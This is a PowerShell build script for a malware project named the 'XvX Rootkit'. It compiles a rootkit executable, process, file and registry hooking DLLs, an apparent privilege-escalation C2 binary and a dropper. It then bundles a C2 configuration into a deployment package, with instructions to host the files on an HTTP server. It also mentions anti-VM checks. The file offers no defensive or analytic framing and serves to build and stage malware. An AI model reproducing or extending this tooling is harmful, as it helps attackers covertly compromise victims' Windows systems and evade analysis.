#!/usr/bin/env pwsh
<#
.SYNOPSIS
    XvX Rootkit - Complete Debug Build Script
    
.DESCRIPTION
    Compiles ALL components (rootkit.exe + DLLs + dropper) with DEBUG mode on rootkit.exe only
    
.EXAMPLE
    .\build_debug_complete.ps1
#>

$ErrorActionPreference = "Stop"

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "  XvX Rootkit - Complete Debug Build" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

$RootDir = $PSScriptRoot
$BuildSuccess = $true
$BuildErrors = @()

# ============================================================================
# 0. CLEAN BUILD
# ============================================================================

Write-Host "[0/7] Clean build - Removing old debug binaries..." -ForegroundColor Magenta

if (Test-Path "$RootDir\debug") {
    Remove-Item "$RootDir\debug\*" -Force -Recurse -ErrorAction SilentlyContinue
} else {
    New-Item -ItemType Directory -Path "$RootDir\debug" | Out-Null
}

# Also clean DLL directories
$filesToClean = @(
    "$RootDir\processHooks\processHooks.dll",
    "$RootDir\fileHooks\fileHooks.dll",
    "$RootDir\registryHooks\registryHooks.dll"
)
foreach ($file in $filesToClean) {
    if (Test-Path $file) {
        Remove-Item $file -Force
    }
}

Write-Host "  [+] Clean completed`n" -ForegroundColor Green

# ============================================================================
# 1. Compile rootkit.exe (DEBUG MODE - avec console et logs)
# ============================================================================

Write-Host "[1/7] Compiling rootkit.exe (DEBUG MODE)..." -ForegroundColor Yellow

Push-Location "$RootDir\src"
try {
    # Debug build: console enabled, debug symbols, no optimization
    $output = & g++ -std=c++17 -static -static-libgcc -static-libstdc++ `
        -I"..\include" main.cpp -o ..\debug\rootkit.exe `
        -lwinhttp -ladvapi32 -lntdll -lpthread `
        -D_DEBUG -g -O0 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "..\debug\rootkit.exe")) {
        $size = (Get-Item "..\debug\rootkit.exe").Length / 1KB
        Write-Host "  [+] rootkit.exe compiled successfully ($([math]::Round($size, 2)) KB) [DEBUG]`n" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling rootkit.exe:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildSuccess = $false
        $BuildErrors += "rootkit.exe compilation failed"
    }
} finally {
    Pop-Location
}

# ============================================================================
# 2. Compile processHooks.dll (PRODUCTION MODE)
# ============================================================================

Write-Host "[2/7] Compiling processHooks.dll..." -ForegroundColor Yellow

Push-Location "$RootDir\processHooks"
try {
    $output = & g++ -shared -std=c++17 -static -static-libgcc -static-libstdc++ `
        -I"..\include" dllmain.cpp -o processHooks.dll `
        -ladvapi32 -lntdll -lpthread `
        -mwindows -DNDEBUG -O2 -s 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "processHooks.dll")) {
        $size = (Get-Item "processHooks.dll").Length / 1KB
        Copy-Item "processHooks.dll" "$RootDir\debug\" -Force
        Write-Host "  [+] processHooks.dll compiled successfully ($([math]::Round($size, 2)) KB)`n" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling processHooks.dll:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildSuccess = $false
        $BuildErrors += "processHooks.dll compilation failed"
    }
} finally {
    Pop-Location
}

# ============================================================================
# 3. Compile fileHooks.dll (PRODUCTION MODE)
# ============================================================================

Write-Host "[3/7] Compiling fileHooks.dll..." -ForegroundColor Yellow

Push-Location "$RootDir\fileHooks"
try {
    $output = & g++ -shared -std=c++17 -static -static-libgcc -static-libstdc++ `
        -I"..\include" dllmain.cpp -o fileHooks.dll `
        -ladvapi32 -lntdll -lpthread `
        -mwindows -DNDEBUG -O2 -s 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "fileHooks.dll")) {
        $size = (Get-Item "fileHooks.dll").Length / 1KB
        Copy-Item "fileHooks.dll" "$RootDir\debug\" -Force
        Write-Host "  [+] fileHooks.dll compiled successfully ($([math]::Round($size, 2)) KB)`n" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling fileHooks.dll:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildSuccess = $false
        $BuildErrors += "fileHooks.dll compilation failed"
    }
} finally {
    Pop-Location
}

# ============================================================================
# 4. Compile registryHooks.dll (PRODUCTION MODE)
# ============================================================================

Write-Host "[4/7] Compiling registryHooks.dll..." -ForegroundColor Yellow

Push-Location "$RootDir\registryHooks"
try {
    $output = & g++ -shared -std=c++17 -static -static-libgcc -static-libstdc++ `
        -I"..\include" dllmain.cpp -o registryHooks.dll `
        -ladvapi32 -lntdll -lpthread `
        -mwindows -DNDEBUG -O2 -s 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "registryHooks.dll")) {
        $size = (Get-Item "registryHooks.dll").Length / 1KB
        Copy-Item "registryHooks.dll" "$RootDir\debug\" -Force
        Write-Host "  [+] registryHooks.dll compiled successfully ($([math]::Round($size, 2)) KB)`n" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling registryHooks.dll:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildSuccess = $false
        $BuildErrors += "registryHooks.dll compilation failed"
    }
} finally {
    Pop-Location
}

# ============================================================================
# 5. Compile PrivEsc_C2.exe
# ============================================================================

Write-Host "[5/7] Compiling PrivEsc_C2.exe..." -ForegroundColor Yellow

Push-Location "$RootDir\PrivEscalation"
try {
    $output = & gcc -static -static-libgcc `
        PrivEsc_C2.c -o PrivEsc_C2.exe `
        -lws2_32 -mwindows -O2 -s 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "PrivEsc_C2.exe")) {
        $size = (Get-Item "PrivEsc_C2.exe").Length / 1KB
        Copy-Item "PrivEsc_C2.exe" "$RootDir\debug\" -Force
        Write-Host "  [+] PrivEsc_C2.exe compiled successfully ($([math]::Round($size, 2)) KB)`n" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling PrivEsc_C2.exe:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildSuccess = $false
        $BuildErrors += "PrivEsc_C2.exe compilation failed"
    }
} finally {
    Pop-Location
}

# ============================================================================
# 6. Compile Dropper.exe
# ============================================================================

Write-Host "[6/7] Compiling droppers..." -ForegroundColor Yellow

Push-Location "$RootDir\dropper"
try {
    Write-Host "  [i] Compiling Dropper.exe..." -ForegroundColor Gray
    $output = & g++ -std=c++17 -static -static-libgcc -static-libstdc++ `
        Dropper.cpp -o Dropper.exe `
        -lwinhttp -lshlwapi -O2 -s 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "Dropper.exe")) {
        $size = (Get-Item "Dropper.exe").Length / 1KB
        Copy-Item "Dropper.exe" "$RootDir\debug\" -Force
        Write-Host "  [+] Dropper.exe compiled ($([math]::Round($size, 2)) KB)`n" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling Dropper.exe:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildSuccess = $false
        $BuildErrors += "Dropper.exe compilation failed"
    }
} finally {
    Pop-Location
}

# ============================================================================
# 7. Copy c2_config.txt
# ============================================================================

Write-Host "[7/7] Creating deployment package..." -ForegroundColor Yellow

if (Test-Path "$RootDir\c2_config.txt") {
    Copy-Item "$RootDir\c2_config.txt" "$RootDir\debug\" -Force
    Write-Host "  [+] c2_config.txt copied" -ForegroundColor Green
}

# ============================================================================
# BUILD COMPLETE
# ============================================================================

if ($BuildSuccess) {
    Write-Host "`n========================================" -ForegroundColor Green
    Write-Host "  DEBUG BUILD SUCCESSFUL!" -ForegroundColor Green
    Write-Host "========================================`n" -ForegroundColor Green
    
    Write-Host "Generated Files:" -ForegroundColor White
    Get-ChildItem "$RootDir\debug" | ForEach-Object {
        $size = $_.Length / 1KB
        Write-Host "  [✓] $($_.Name)".PadRight(35) "($([math]::Round($size, 2)) KB)" -ForegroundColor Cyan
    }
    
    Write-Host "`n[DEBUG MODE]" -ForegroundColor Magenta
    Write-Host "  - rootkit.exe: Console + Logs ENABLED" -ForegroundColor Gray
    Write-Host "  - DLLs: Production mode (silent)" -ForegroundColor Gray
    Write-Host "  - Anti-VM checks: DISABLED" -ForegroundColor Gray
    
    Write-Host "`nUsage:" -ForegroundColor White
    Write-Host "  Test Rootkit:  cd debug && .\rootkit.exe" -ForegroundColor Gray
    Write-Host "  Deploy:        Copy files from debug\ to HTTP server" -ForegroundColor Gray
} else {
    Write-Host "`n========================================" -ForegroundColor Red
    Write-Host "  BUILD FAILED!" -ForegroundColor Red
    Write-Host "========================================`n" -ForegroundColor Red
    Write-Host "Errors:" -ForegroundColor Red
    $BuildErrors | ForEach-Object { Write-Host "  - $_" -ForegroundColor Red }
    exit 1
}
